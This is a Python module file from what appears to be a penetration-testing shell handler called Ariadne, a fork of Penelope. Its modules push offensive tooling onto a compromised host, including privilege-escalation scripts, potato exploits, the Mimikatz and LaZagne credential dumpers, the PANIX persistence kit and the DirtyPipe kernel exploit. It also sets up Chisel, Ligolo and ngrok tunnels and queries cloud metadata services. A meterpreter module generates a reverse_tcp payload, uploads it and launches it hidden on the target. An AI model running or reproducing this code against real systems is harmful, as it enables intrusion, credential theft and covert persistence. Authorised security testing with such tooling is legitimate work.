#!/usr/bin/env python3

# Part of Ariadne Shell Handler (a fork of Penelope, GPL-3.0-or-later). See LICENSE.

from .compat import *
from .options import options
from .log import logger, cmdlogger
from .cli_input import ask, ask_target_os
from .payload_data import URLS, PYTHON_STANDALONE_BINARIES
from .display import paint, Open
from .utils import url_to_bytes

# menu: injected by ariadne/__init__.py after the singleton exists.

def upload_extracted_archive(session, url, name, flatten=False, remote_path=None):
	_, archive = url_to_bytes(url)
	if not archive:
		logger.error(f"Failed to download {name}")
		return False
	with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
		if flatten:
			with zipfile.ZipFile(io.BytesIO(archive)) as z:
				z.extractall(tmpdir)
			entries = list(Path(tmpdir).iterdir())
			if not entries:
				logger.error(f"{name} archive was empty")
				return False
			folder = entries[0].parent / name
			os.rename(entries[0], folder)
		else:
			folder = Path(tmpdir) / name
			folder.mkdir(parents=True, exist_ok=True)
			with zipfile.ZipFile(io.BytesIO(archive)) as z:
				z.extractall(folder)
		return session.upload(str(folder), remote_path=remote_path)




def upload_single_from_archive(session, url, member, arcname, remote_path=None):
	_, archive = url_to_bytes(url)
	if not archive:
		logger.error(f"Failed to download {arcname}")
		return False
	buf = io.BytesIO(archive)
	if member is None:
		with gzip.GzipFile(fileobj=buf, mode="rb") as g:
			data = g.read()
	elif zipfile.is_zipfile(buf):
		buf.seek(0)
		with zipfile.ZipFile(buf) as z:
			try:
				data = z.read(member)
			except KeyError:
				logger.error(f"File '{member}' not found in downloaded archive")
				return False
	else:
		buf.seek(0)
		# 'r:*' auto-detects the compression (gz/xz/bz2), so tar.xz release
		# assets work too.
		with tarfile.open(fileobj=buf, mode="r:*") as tf:
			try:
				f = tf.extractfile(tf.getmember(member))
			except KeyError:
				f = None
			if f is None:
				logger.error(f"File '{member}' not found in downloaded archive")
				return False
			data = f.read()
	return session.upload(url, url_to_bytes_fn=lambda x: (arcname, data), remote_path=remote_path)




def ensure_target_binaries(session, requirements):
	"""Check helper binaries on a Unix target and offer to install the package
	providing them via the target's package manager (apk/apt/dnf/yum/zypper).

	requirements maps binary name -> package name, e.g. {'ps': 'procps'}.
	Nothing runs when everything is already present. Each missing binary gets
	ONE prompt (default: No) because installing packages is visible on the
	target: package-manager logs, disk writes and mirror traffic. Returns True
	when every requirement is satisfied, False otherwise (the caller decides
	whether that is fatal)."""
	if session.OS != 'Unix':
		return True

	def present(binary):
		try:
			return session.exec(
				f'command -v {shlex.quote(binary)} >/dev/null 2>&1 '
				'&& echo ariadne-present || echo ariadne-missing',
				value=True
			) == 'ariadne-present'
		except Exception:
			return False

	missing = [binary for binary in requirements if not present(binary)]
	if not missing:
		return True

	package_manager = None
	for name, install_cmd in (
		('apk', 'apk add --no-cache'),
		('apt-get', 'DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends'),
		('dnf', 'dnf install -y'),
		('yum', 'yum install -y'),
		('zypper', 'zypper --non-interactive install'),
	):
		if present(name):
			package_manager = (name, install_cmd)
			break
	if not package_manager:
		for binary in missing:
			logger.error(f"'{binary}' is missing on the target and no supported package manager was found")
		return False

	name, install_cmd = package_manager
	for binary in missing:
		package = requirements[binary]
		if ask(f"'{binary}' is missing on the target. Install '{package}' via {name}? (y/N): ").lower() != 'y':
			return False
		logger.info(f"Installing {paint(package).green} on the target via {name} (visible to the target's defenders)")
		try:
			session.exec(f'{install_cmd} {shlex.quote(package)}', value=True, timeout=None)
		except Exception as e:
			logger.error(f"Install command failed: {e}")
		if present(binary):
			logger.info(f"'{binary}' is now available on the target")
		else:
			logger.error(f"Could not install '{package}'; install it manually, e.g.: {install_cmd} {package}")
			return False
	return True


def modules():
	return {module.__name__:module for module in Module.__subclasses__()}





def run_operator_tool(name, executables, arguments):
	"""Run an installed operator-side tool without passing input through a shell."""
	executable = None
	for candidate in executables:
		executable = shutil.which(candidate)
		if executable:
			break
	if not executable:
		logger.error(f"{name} is not installed locally. Install it in the Ariadne operator environment first.")
		return False
	try:
		logger.info(f"Running {name} locally on the Ariadne host")
		result = subprocess.run([executable] + list(arguments), check=False)
	except OSError as e:
		logger.error(f"Could not start {name}: {e}")
		return False
	if result.returncode:
		logger.error(f"{name} exited with status {result.returncode}")
		return False
	return True




class Module:
	enabled = True
	on_session_start = False
	on_first_attach = False
	on_session_end = False
	category = "Misc"


class upload_privesc_scripts(Module):
	category = "Privilege Escalation"

	unix_tools = {
		"linpeas": lambda session: session.upload(URLS['linpeas']),
		"lse": lambda session: session.upload(URLS['lse']),
		"linenum": lambda session: session.upload(URLS['linenum']),
		"les": lambda session: session.upload(URLS['les']),
		"deepce": lambda session: session.upload(URLS['deepce']),
		"pspy": lambda session: (
			session.upload(URLS['pspy64']) if session.arch == "x86_64"
			else session.upload(URLS['pspy32']) if session.arch in ("i386", "i686")
			else logger.error("pspy: No compatible binary architecture \n")
		),
		"amicontained": lambda session: session.upload(URLS['amicontained']),
		"cdk": lambda session: session.upload(URLS['cdk']),
	}

	# Large binaries are only uploaded when explicitly requested, so a bare
	# 'upload_privesc_scripts' does not silently push tens of megabytes.
	default_skip = {"cdk"}

	windows_tools = {
		"winpeas": lambda session: session.upload(URLS['winpeas_any']),
		"winpeas_bat": lambda session: session.upload(URLS['winpeas_bat']),
		"powerup": lambda session: session.upload(URLS['powerup']),
		"privesccheck": lambda session: session.upload(URLS['privesccheck']),
		"fullpowers": lambda session: session.upload(URLS['fullpowers']),
		"enablealltokenprivs": lambda session: session.upload(URLS['enablealltokenprivs']),
		"sharpup": lambda session: session.upload(URLS['sharpup']),
		"sharpdpapi": lambda session: session.upload(URLS['sharpdpapi']),
	}

	def run(session, args):
		"""
		Upload {linpeas, lse, linenum, les, deepce, pspy, amicontained, cdk || winpeas, winpeas_bat, powerup, privesccheck, fullpowers, enablealltokenprivs, sharpup, sharpdpapi}
		Example:
			upload_privesc_scripts winpeas
			upload_privesc_scripts linpeas pspy64
		"""
		if not session.write_access(session.cwd):
			return

		requested = args.split() if args else []

		if session.OS == 'Unix':
			tools = __class__.unix_tools

		elif session.OS == 'Windows':
			tools = __class__.windows_tools

		else:
			logger.error(f"Unsupported OS: {session.OS}")
			return

		if not requested:
			logger.info("No tools specified, uploading all (skipped: " + ", ".join(sorted(__class__.default_skip)) + ")")
			print()
			requested = [tool for tool in tools.keys() if tool not in __class__.default_skip]

		for tool in requested:

			if session.OS == 'Unix' and tool in __class__.windows_tools:
				logger.warning(f"{tool} is not available on Unix targets")
				continue
			if session.OS == 'Windows' and tool in __class__.unix_tools:
				logger.warning(f"{tool} is not available on Windows targets")
				continue
			if tool not in tools:
				logger.error(f"Unknown tool: {tool}")
				continue
			try:
				tools[tool](session)
			except Exception as e:
				logger.error(f"Failed to upload {tool}: {e}")


class upload_potato(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Upload {GodPotato, SigmaPotato, PrintSpoofer}
		Example:
			potato GodPotato
		"""
		if not session.write_access(session.cwd):
			return

		requested = args.split() if args else []

		if session.OS == "Unix":
			logger.error("This module runs only on Windows shells")
			return
		elif session.OS == "Windows":
			tools = {
				"GodPotato": lambda: session.upload(URLS['godpotato']),
				"SigmaPotato": lambda: session.upload(URLS['sigmapotato']),
				"PrintSpoofer": lambda: (
					session.upload(URLS['printspoofer64']) if session.arch == "x64-based_PC"
					else session.upload(URLS['printspoofer32']) if session.arch == "x86-based_PC"
					else logger.error("PrintSpoofer: No predefined binary to upload")
				),
			}
		else:
			logger.error(f"Unsupported OS: {session.OS}")
			return
		if not requested:
			logger.info("No tools specified, uploading all")
			print()
			requested = list(tools.keys())

		for tool in requested:
			if tool not in tools:
				logger.error(f"Unknown tool: {tool}")
				continue
			try:
				tools[tool]()
			except Exception as e:
				logger.error(f"Failed to upload {tool}: {e}")

class peass_ng(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of PEASS-ng in the background
		"""
		if session.OS == 'Unix':
			ensure_target_binaries(session, {'ps': 'procps'})
			session.script(URLS['linpeas'])

		elif session.OS == 'Windows':
			logger.error("This module runs only on Unix shells")
			while True:
				answer = ask(f"Use {paint('upload_privesc_scripts').LIGHTGREY_black}{paint(' instead? (Y/n): ').yellow}").lower()
				if answer in ('y', ''):
					menu.do_run('upload_privesc_scripts')
					break
				elif answer == 'n':
					break


class lse(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of linux-smart-enumeration in the background
		"""
		if session.OS == 'Unix':
			# lse's process monitor polls 'ps' every millisecond; without it the
			# output file floods with "ps: not found" on minimal images.
			ensure_target_binaries(session, {'ps': 'procps'})
			session.script(URLS['lse'])
		else:
			logger.error("This module runs only on Unix shells")


class linuxexploitsuggester(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of linux-exploit-suggester in the background
		"""
		if session.OS == 'Unix':
			session.script(URLS['les'])
		else:
			logger.error("This module runs only on Unix shells")


class traitor(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Upload Traitor
		"""
		if session.OS == 'Unix':
			if session.arch == "x86_64":
				session.upload(URLS['traitor_amd64'])
			elif session.arch in ("i386", "i686"):
				session.upload(URLS['traitor_386'])
			elif session.arch in ("aarch64", "arm64"):
				session.upload(URLS['traitor_arm64'])
			else:
				logger.error("Traitor: No compatible binary architecture")
				print()

		elif session.OS == 'Windows':
			logger.error("This module runs only on Unix shells")


class upload_credump_scripts(Module):
	category = "Credential Dumping"

	def run(session, args):
		"""
		Upload {Mimikatz, LaZagne, Snaffler, SharpWeb}
		"""
		if not session.write_access(session.cwd):
			return

		if session.OS == 'Unix':
			logger.error("This module runs only on Windows shells")
		if session.OS == 'Windows':
			requested = [t.lower() for t in args.split()] if args else []

			tools = {
				"mimikatz": lambda session: upload_extracted_archive(session, URLS['mimikatz'], "mimikatz"),
				"lazagne": lambda session: session.upload(URLS['lazagne']),
				"snaffler": lambda session: session.upload(URLS['snaffler']),
				"sharpweb": lambda session: session.upload(URLS['sharpweb'])
			}

			if not requested:
				logger.info("No tools specified, uploading all")
				print()
				requested = list(tools.keys())

			for tool in requested:
				if tool not in tools:
					logger.error(f"Unknown tool: {tool}")
					continue
				try:
					tools[tool](session)
				except Exception as e:
					logger.error(f"Failed to upload {tool}: {e}")


class upload_ad_scripts(Module):
	category = "Active Directory"

	def run(session, args):
		"""
		Upload {PowerView, SharpHound, GhostPack, adPEAS}
		"""
		if not session.write_access(session.cwd):
			return

		if session.OS == 'Unix':
			logger.error("This module runs only on Windows shells")
		if session.OS == 'Windows':
			requested = [t.lower() for t in args.split()] if args else []

			tools = {
				"powerview": lambda session: session.upload(URLS['powerview']),
				"sharphound": lambda session: upload_extracted_archive(session, URLS['sharphound'], "sharphound"),
				"ghostpack":  lambda session: upload_extracted_archive(session, URLS['ghostpack'], "ghostpack", flatten=True),
				"adpeas":     lambda session: session.upload(URLS['adpeas']),
			}

			if not requested:
				logger.info("No tools specified, uploading all")
				print()
				requested = list(tools.keys())

			for tool in requested:
				if tool not in tools:
					logger.error(f"Unknown tool: {tool}")
					continue
				try:
					tools[tool](session)
				except Exception as e:
					logger.error(f"Failed to upload {tool}: {e}")


class certipy(Module):
	category = "Active Directory"
	def run(session, args):
		"""
		Run Certipy's AD CS configuration enumeration (`find`) on the operator host.
		Usage: certipy [-u user@domain] [-p password] [-dc-ip address] [other find options]
		Example: run certipy -u analyst@example.test -dc-ip 10.10.10.5
		Requires Certipy installed locally. Results and output files are created locally.
		"""
		try:
			arguments = shlex.split(args) if args else []
		except ValueError as e:
			logger.error(f"Invalid Certipy arguments: {e}")
			return
		arguments.insert(0, 'find')
		return run_operator_tool('Certipy', ('certipy', 'certipy-ad'), arguments)


class seatbelt(Module):
	category = "Host Enumeration"
	def run(session, args):
		"""
		Run selected Seatbelt checks from an uploaded GhostPack bundle and download JSON output.
		Usage: seatbelt [--group user|system|misc|all] [--full]
		Upload GhostPack first with `run upload_ad_scripts ghostpack`.
		"""
		if session.OS != 'Windows':
			logger.error("Seatbelt runs only on Windows sessions")
			return
		parser = ArgumentParser(prog='seatbelt', description='Run Seatbelt checks on the selected Windows session')
		parser.add_argument('--group', choices=('user', 'system', 'misc', 'all'), default='system')
		parser.add_argument('--full', action='store_true', help='Include full, less-filtered check results')
		try:
			options_seatbelt = parser.parse_args(shlex.split(args) if args else [])
		except SystemExit:
			return

		bundle = next((path for path in session.uploaded_paths
			if PureWindowsPath(path.strip('"')).name.lower() == 'ghostpack'), None)
		if not bundle:
			logger.error("GhostPack is not uploaded. Run 'upload_ad_scripts ghostpack' first")
			return
		temp_dir = session.tmp
		if not temp_dir:
			logger.error("Could not determine a temporary directory on the target")
			return
		binary = str(PureWindowsPath(bundle.strip('"'), 'Seatbelt.exe'))
		output = str(PureWindowsPath(temp_dir, f'ariadne-seatbelt-{rand(8)}.json'))
		command = f'"{binary}" -group={options_seatbelt.group} -q -outputfile="{output}"'
		if options_seatbelt.full:
			command += ' -full'
		if session.subtype == 'psh':
			command = '& ' + command

		logger.info(f"Running Seatbelt {options_seatbelt.group} checks on the selected Windows session")
		result = session.exec(command, value=True, timeout=None)
		if result is False:
			logger.error("Seatbelt command could not be completed")
			return
		try:
			downloaded = session.download(f'"{output}"')
			if downloaded:
				logger.info(f"Seatbelt report saved locally: {downloaded[0]}")
			else:
				logger.error("Seatbelt did not produce a downloadable report")
		finally:
			if session.subtype == 'psh':
				session.exec(f'Remove-Item -LiteralPath "{output}" -Force -ErrorAction SilentlyContinue', value=True)
			else:
				session.exec(f'del /f /q "{output}"', force_cmd=True, value=True)


class enum4linux_ng(Module):
	category = "Network Enumeration"
	def run(session, args):
		"""
		Run enum4linux-ng locally against a target reachable from the operator host.
		Usage: enum4linux_ng [host] [options]
		With no arguments, runs `-A` against the selected session's IP. Results are local.
		Requires enum4linux-ng and its Samba command-line tools installed locally.
		"""
		try:
			arguments = shlex.split(args) if args else [session.ip, '-A']
		except ValueError as e:
			logger.error(f"Invalid enum4linux-ng arguments: {e}")
			return
		if not arguments:
			logger.error("Usage: run enum4linux_ng [host] [options]")
			return
		return run_operator_tool('enum4linux-ng',
			('enum4linux-ng', 'enum4linux-ng.py'), arguments)


class uac(Module):
	category = "Forensics"
	def run(session, args):
		"""
		Collect forensic artifacts using Unix-like Artifacts Collector in the background
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			if not session.exec_tmp:
				logger.error("No writable+executable directory on the target (noexec?)")
				return False
			uploaded = session.upload(URLS['uac_linux'], remote_path=session.exec_tmp)
			if not uploaded:
				logger.error("Failed to upload UAC")
				return False
			path = shlex.quote(uploaded[0])
			result = session.exec(f"tar xf {path} -C {shlex.quote(session.exec_tmp)} >/dev/null", value=True)
			if not result:
				session.exec(f"rm -f {path}")
				logger.info(f"UAC successfully extracted on {sanitize_meta(session.exec_tmp)}")
			else:
				logger.error(f"Extraction to {sanitize_meta(session.exec_tmp)} failed:\n{indent(sanitize_meta(result), ' ' * 4 + '- ')}")
				return False
			# UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
			base = re.sub(r'\.tar\.gz$', '', shlex.split(path)[0])
			session.uploaded_paths[shlex.quote(base)] = int(time.time())
			cmd = f"cd {shlex.quote(base)}; ./uac -u -p ir_triage --output-format tar {shlex.quote(session.tmp)}"
			#session.exec(cmd)
			fd, tf = tempfile.mkstemp(prefix="ariadne-", suffix=".sh")
			with os.fdopen(fd, "w") as f:
				f.write("#!/bin/sh\n")
				f.write(cmd)
			logger.info(f"UAC output will be stored at {sanitize_meta(session.tmp)}/uac-%hostname%-%os%-%timestamp%")
			session.script(tf)
			# Once completed, transfer the output files to your host
		else:
			logger.error("This module runs only on Unix shells")


class linux_procmemdump(Module):
	category = "Forensics"
	def run(session, args):
		"""
		Dump process memory in the background (requires root)
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			if not session.exec_tmp:
				logger.error("No writable+executable directory on the target (noexec?)")
				return False
			session.upload(URLS['linux_procmemdump'], remote_path=session.exec_tmp)
			print(session.exec(f"ps -eo pid,cmd", value=True))
			logger.info(f"Please provide the PID of the process to be acquired:")
			PID = input("PID: ")
			session.exec(f"{shlex.quote(session.exec_tmp + '/linux_procmemdump.sh')} -p {PID} -s -d {shlex.quote(session.tmp)}")
			logger.info(f"Strings of the process dump will be stored at {sanitize_meta(session.tmp)}/{PID}/")
		else:
			logger.error("This module runs only on Unix shells")


class ligolo(Module):
	category = "Pivoting"
	def run(session, args):
		"""
		Upload Ligolo-ng agent
		"""
		if session.OS == 'Unix':
			if session.arch == "x86_64":
				url = URLS['ligolo_amd64']
			elif session.arch in ("aarch64", "arm64"):
				url = URLS['ligolo_arm64']
			else:
				logger.error("Ligolo-ng: No predefined binary to upload.")
				print()
				return
			upload_single_from_archive(session, url, "agent", "agent")

		elif session.OS == 'Windows':
			if session.arch == "x64-based_PC":
				url = URLS['ligolo_win64']
			else:
				logger.error("Ligolo-ng: No predefined binary to upload.")
				print()
				return
			upload_single_from_archive(session, url, "agent.exe", "agent.exe")


class chisel(Module):
	category = "Pivoting"
	def run(session, args):
		"""
		Upload Chisel
		"""
		if session.OS == 'Unix':
			if session.arch == "x86_64":
				url = URLS['chisel_amd64']
			elif session.arch in ("i386", "i686"):
				url = URLS['chisel_386']
			elif session.arch in ("aarch64", "arm64"):
				url = URLS['chisel_arm64']
			else:
				logger.error("Chisel: No predefined binary to upload.")
				print()
				return
			upload_single_from_archive(session, url, None, "chisel")

		elif session.OS == 'Windows':
			if session.arch == "x64-based_PC":
				url = URLS['chisel_winamd64']
			elif session.arch == "x86-based_PC":
				url = URLS['chisel_win386']
			else:
				logger.error("Chisel: No predefined binary to upload.")
				print()
				return
			upload_single_from_archive(session, url, "chisel.exe", "chisel.exe")


class ngrok(Module):
	category = "Pivoting"
	def run(session, args):
		"""
		Setup and create a TCP tunnel using ngrok
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			if not session.exec_tmp:
				logger.error("No writable+executable directory on the target (noexec?)")
				return False
			if session.arch != 'x86_64':
				logger.error(f"No prebuilt ngrok binary for arch '{session.arch}'")
				return False
			uploaded = upload_single_from_archive(session, URLS['ngrok_linux'], "ngrok", "ngrok", remote_path=session.exec_tmp)
			if not uploaded:
				logger.error("Failed to upload ngrok")
				return False

			token = input("Authtoken: ")
			session.exec(f"{shlex.quote(session.exec_tmp + '/ngrok')} config add-authtoken {token}")
			logger.info("Provide a TCP port number to be exposed in ngrok cloud:")
			tcp_port = input("tcp_port: ")
			#logger.info("Indicate if a TCP or an HTTP tunnel is required?:")
			#tunnel = input("tunnel: ")
			cmd = f"cd {shlex.quote(session.exec_tmp)}; ./ngrok tcp {tcp_port} --log=stdout"
			print(cmd)
			#session.exec(cmd)
			fd, tf = tempfile.mkstemp(prefix="ariadne-", suffix=".sh")
			with os.fdopen(fd, "w") as f:
				f.write("#!/bin/sh\n")
				f.write(cmd)
			logger.info(f"ngrok session open")
			session.script(tf)
		else:
			logger.error("This module runs only on Unix shells")


class upload_k8s_tools(Module):
	category = "Pivoting"
	def run(session, args):
		"""
		Upload {peirates, kubeletctl} for Kubernetes enumeration/escalation from inside a pod
		Example:
			upload_k8s_tools peirates
		"""
		if session.OS != 'Unix':
			logger.error("This module runs only on Unix shells")
			return

		requested = args.split() if args else []
		tools = {
			"peirates": lambda: upload_single_from_archive(session, URLS['peirates'], "peirates", "peirates"),
			"kubeletctl": lambda: session.upload(URLS['kubeletctl']),
		}
		if not requested:
			requested = list(tools.keys())
		for tool in requested:
			if tool not in tools:
				logger.error(f"Unknown tool: {tool}")
				continue
			try:
				tools[tool]()
			except Exception as e:
				logger.error(f"Failed to upload {tool}: {e}")





class virt_enum(Module):
	category = "Host Enumeration"
	def run(session, args):
		"""
		Detect virtualization, container runtime and cloud presence from the target (read-only)
		Add 'cloud' to also probe the instance metadata services (makes network calls!)
		Example:
			virt_enum
			virt_enum cloud
		"""
		if session.OS != 'Unix':
			logger.error("This module runs only on Unix shells")
			return

		script = (
			'echo "--- systemd-detect-virt ---"; '
			'command -v systemd-detect-virt >/dev/null 2>&1 '
			'&& systemd-detect-virt -cv 2>/dev/null || echo "not available"; '
			'echo "--- DMI ---"; '
			'cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | head -2; '
			'echo "--- container markers ---"; '
			'ls /.dockerenv 2>/dev/null || echo "no /.dockerenv"; '
			'ls /run/.containerenv 2>/dev/null || echo "no /run/.containerenv"; '
			'echo "--- cgroup ---"; '
			'grep -aoE "docker|kubepods|containerd|lxc" /proc/1/cgroup 2>/dev/null | sort -u || echo "no markers"; '
			'echo "--- xen/vz/wsl ---"; '
			'ls /proc/xen 2>/dev/null || echo "no xen"; '
			'grep -ai microsoft /proc/version 2>/dev/null || echo "no wsl"'
		)
		result = session.exec(script, value=True)
		if isinstance(result, str) and result.strip():
			print(result)
		else:
			logger.error("virt_enum: no output from the target")

		if 'cloud' in (args or '').lower():
			cloud_script = (
				'echo "--- AWS IMDS ---"; '
				'command -v curl >/dev/null && curl -s -m 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5 '
				'|| echo "no response"; '
				'echo "--- GCP metadata ---"; '
				'command -v curl >/dev/null && curl -s -m 2 -H "Metadata-Flavor: Google" '
				'http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -5 || echo "no response"; '
				'echo "--- Azure IMDS ---"; '
				'command -v curl >/dev/null && curl -s -m 2 -H "Metadata:true" '
				'"http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -5 || echo "no response"'
			)
			cloud = session.exec(cloud_script, value=True)
			if isinstance(cloud, str) and cloud.strip():
				print(cloud)


class panix(Module):
	category = "Persistence"
	def run(session, args):
		"""
		Upload PANIX
		"""
		if session.OS == 'Unix':
			session.upload(URLS['panix'])
		else:
			logger.error("This module runs only on Unix shells")


class upload_local_exploits(Module):
	category = "Privilege Escalation"

	def dirtyfrag(session):
		if session.system != "Linux":
			logger.error("This module runs only on Linux shells")
			return

		uploaded = session.upload(URLS['dirtyfrag'])
		if not uploaded:
			logger.error("Failed to upload DirtyFrag")
			return
		logger.info("DirtyFrag uploaded. Compile on target: gcc exp.c -o exp")

	def dirtypipe(session):
		if session.system != "Linux":
			logger.error("This module runs only on Linux shells")
			return

		if not upload_extracted_archive(session, URLS['dirtypipe_zip'], "dirtypipe", flatten=True):
			return
		logger.info("DirtyPipe uploaded. Compile on target: cd dirtypipe && gcc exploit-1.c -o exploit-1  ||  gcc exploit-2.c -o exploit-2")

	def run(session, args):
		"""
		Upload local exploits {DirtyFrag, DirtyPipe}
		"""
		if not session.write_access(session.cwd):
			return

		requested = [t.lower() for t in args.split()] if args else []

		tools = {
			"dirtypipe": __class__.dirtypipe,
			"dirtyfrag": __class__.dirtyfrag
		}

		if not requested:
			logger.warning(f"Please choose an exploit: {list(tools.keys())}")

		for tool in requested:
			if tool not in tools:
				logger.error(f"Unknown tool: {tool}")
				continue
			try:
				tools[tool](session)
			except Exception as e:
				logger.error(f"Failed to upload {tool}: {e}")


class meterpreter(Module):
	def run(session, args):
		"""
		Spawn a Meterpreter session (Windows and Linux targets)
		Optional: -p LPORT (default 5555), -H LHOST (default: jump host if set, else the session's local address)
		"""
		if not shutil.which("msfvenom"):
			logger.error("'msfvenom' not found locally. Install Metasploit to use this module.")
			return
		if not shutil.which("msfconsole"):
			logger.warning("'msfconsole' not found locally; you'll need to start the handler manually")

		parser = ArgumentParser(prog="meterpreter", description="Spawn a Meterpreter session")
		parser.add_argument("-p", "--port", type=int, default=5555, help="Handler/LPORT (default: 5555)")
		parser.add_argument("-H", "--host", "--lhost", default=None, help="LHOST (default: jump host if set, else the session's local address)")
		try:
			opts = parser.parse_args(shlex.split(args) if args else [])
		except SystemExit:
			return
		host, port = opts.host, opts.port
		if not (0 < port < 65536):
			logger.error(f"Invalid port: {port}")
			return

		if session.OS == 'Windows':
			payload_arch = 'windows/x64/' if session.arch == "x64-based_PC" else 'windows/'
			payload_fmt, payload_ext = 'exe', '.exe'
		elif session.OS == 'Unix':
			# session.arch comes from the setup-time probe, which can be
			# garbled on agent sessions (PTY echo interleaving); re-probe
			# fresh and map tolerantly.
			arch_map = {
				"x86_64": 'linux/x64/', "amd64": 'linux/x64/', "x64": 'linux/x64/',
				"i386": 'linux/x86/', "i686": 'linux/x86/', "x86": 'linux/x86/',
				"aarch64": 'linux/aarch64/', "arm64": 'linux/aarch64/',
			}
			probed = (session.exec('uname -m', value=True) or '').strip().lower()
			cached = str(getattr(session, 'arch', '')).strip().lower()
			payload_arch = arch_map.get(probed) or arch_map.get(cached)
			if not payload_arch:
				logger.error(f"Meterpreter: no payload mapping for arch '{probed or cached}'")
				return
			logger.info(f"Target arch: {paint(probed or cached).cyan} -> {payload_arch}meterpreter")
			payload_fmt, payload_ext = 'elf', '.elf'
		else:
			logger.error(f"Meterpreter: unsupported OS '{session.OS}'")
			return

		if host is None:
			if session.listener and session.listener.jump:
				if len(session.listener.jump) == 1:
					host = session.listener.jump[0][0]
				else:
					[print(f"* {j[0]}:{j[1]}") for j in session.listener.jump]
					while True:
						e = ask("Endpoint (host:port): ")
						host = e.split(":")[0].strip()
						if host:
							break
						logger.error(f"Invalid endpoint: {e}")
			else:
				host = session._host

		payload_name = f"{rand(10)}{payload_ext}"
		with tempfile.TemporaryDirectory(prefix="ariadne-msf-") as tmpdir:
			payload_path = os.path.join(tmpdir, payload_name)

			logger.info("Creating payload...")
			payload_creation_cmd = [
				"msfvenom", "-p", f"{payload_arch}meterpreter/reverse_tcp",
				f"LHOST={host}", f"LPORT={port}",
				"-f", payload_fmt, "-o", payload_path
			]
			print(payload_creation_cmd)
			result = subprocess.run(payload_creation_cmd, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

			if result.returncode != 0:
				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
				return

			logger.info("Payload created!")

			if session.OS == 'Unix':
				# The ELF must live in a writable AND executable directory.
				destination = session.exec_tmp or session.tmp
			else:
				destination = session.tmp
			uploaded_path = session.upload(payload_path, destination)
			if not uploaded_path:
				return

			meterpreter_handler_cmd = (
				'msfconsole -x "use exploit/multi/handler; '
				f'set payload {payload_arch}meterpreter/reverse_tcp; '
				f'set LHOST {host}; set LPORT {port}; run"'
			)

			# One handler is enough: if something already listens on the
			# handler port (e.g. msfconsole from a previous run), just launch
			# the payload instead of spawning a second failing handler.
			probe = socket.socket()
			try:
				probe.bind(('' if not host else host, port))
				port_free = True
			except OSError:
				port_free = False
			finally:
				probe.close()

			if port_free:
				Open(meterpreter_handler_cmd, terminal=True)
				logger.info("Starting handler...")
				print(meterpreter_handler_cmd)
			else:
				logger.info(f"Handler already listening on {host}:{port}; launching payload only")

			if session.OS == 'Windows':
				if session.subtype == 'psh':
					session.exec(f'Start-Process -WindowStyle Hidden "{uploaded_path[0]}"')
				else:
					session.exec(f'start /b "" "{uploaded_path[0]}"')
			else:
				q = shlex.quote(uploaded_path[0])
				session.exec(f'chmod +x {q}')
				# nohup + & so the payload survives the exec that launched it
				session.exec(f'nohup {q} >/dev/null 2>&1 &')


class cleanup(Module):
	def run(session, args):
		"""
		Remove uploaded files and directories from the target
		"""
		for item in list(session.uploaded_paths.keys()):
			if session.OS == 'Unix':
				p = shlex.split(item)[0]
				q = shlex.quote(p)
				response = session.exec(f'[ -e {q} ] && echo "exists" || echo "no"', value=True)
				if response == 'exists':
					response = session.exec(f'rm -rf -- {q};echo $?', value=True)
					if response == '0':
						logger.info(f"Deleted '{p}'")
						del session.uploaded_paths[item]
					else:
						logger.error(f"Error deleting '{p}'")
				else:
					logger.debug(f"'{p}' already gone")
					del session.uploaded_paths[item]
			else:
				p = item.strip('"')
				response = session.exec(f'cmd /Q /D /C if exist "{p}" (echo exists) else (echo no)', force_cmd=True, value=True)
				if response == 'exists':
					if session.subtype == 'cmd':
						session.exec(f'set "RM_PATH={p}"')
					elif session.subtype == 'psh':
						session.exec(f'$env:RM_PATH = "{p}"')
					session.exec(
						'cmd /Q /D /C if exist "%RM_PATH%\\*" (rd /s /q "%RM_PATH%") else (del /f /q "%RM_PATH%")',
						value=True, force_cmd=True
					)
					deleted = session.exec(
						'cmd /Q /D /C if exist "%RM_PATH%" (echo 1) else (echo 0)',
						value=True, force_cmd=True
					)
					if deleted == '0':
						logger.info(f"Deleted '{p}'")
						del session.uploaded_paths[item]
					else:
						logger.error(f"Error deleting '{p}'")

				else:
					logger.debug(f"'{p}' already gone")
					del session.uploaded_paths[item]
